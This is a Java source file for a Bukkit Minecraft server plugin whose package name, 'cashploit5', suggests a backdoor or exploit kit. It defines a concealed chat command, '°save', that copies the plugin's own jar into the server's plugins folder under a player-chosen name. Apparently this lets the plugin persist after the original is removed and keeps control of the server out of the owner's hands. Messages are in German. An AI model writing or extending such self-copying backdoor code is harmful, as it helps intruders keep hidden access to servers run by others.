package de.cashploit5.command;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;

import org.bukkit.entity.Player;

import com.google.common.io.Files;

import de.cashploit5.Main;

public class SaveCommand extends Command {

	public SaveCommand() {
		super("Save");
	}

	public void onCommand(Player p, Command command, String[] args) {

		if (args.length == 2) {
			String kopie = args[1];
			String plugin = "";
			try {
				plugin = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().toString()
						.replaceFirst("file:/", "");
			} catch (URISyntaxException e1) {

			}
			if (!kopie.endsWith(".jar"))
				kopie += ".jar";

			plugin = plugin.replace("..", ".");
			kopie = kopie.replace("..", ".");

			File f = new File("./plugins");

			if (new File(plugin).exists()) {
				if (!new File(f, kopie).exists()) {
					try {
						Files.copy(new File(plugin), new File(f, kopie));
						p.sendMessage("§aPlugin erfolgreich kopiert!");
					} catch (IOException e) {
						p.sendMessage("§cEin Fehler ist aufgetreten beim kopieren!");
					}

				} else {
					p.sendMessage("§cEs giebt bereits ein Plugin mit dem Namen §6" + kopie + "§c.");
				}
			} else {
				p.sendMessage("§cAngegebenes Plugin existiert nicht! §6" + plugin);
			}

		} else {
			p.sendMessage("§c°save <Name der Kopie>");
		}

	}

}
